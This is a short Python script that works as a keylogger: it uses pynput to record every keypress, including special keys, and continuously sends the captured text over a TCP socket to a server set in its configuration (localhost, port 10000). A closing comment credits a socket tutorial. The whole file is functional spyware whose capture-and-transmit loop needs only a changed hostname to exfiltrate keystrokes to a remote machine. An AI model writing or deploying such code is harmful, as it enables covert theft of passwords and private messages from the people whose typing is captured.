from pynput import keyboard
import socket
import sys

PORT = 10000
HOSTNAME = 'localhost'

message = ""


def on_press(key):
    global message
    try:
        message += '{0}'.format(key.char)
    except AttributeError:
        if key == keyboard.Key.space:
            message += ' '
        elif key == keyboard.Key.enter:
            message += '[Enter Pressed]\n'
        else:
            message += '[{0}]'.format(key)


# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
server_address = (socket.gethostbyname(HOSTNAME), PORT)
print('connecting to {} port {}'.format(*server_address))
sock.connect(server_address)

try:
    # Collect events
    listener = keyboard.Listener(on_press=on_press)
    listener.start()

    while True:
        # Send data
        if message != '':
            sock.send(message.encode('ascii'))
            message = ''

finally:
    print('closing socket')
    sock.close()


# Source: https://pymotw.com/3/socket/tcp.html
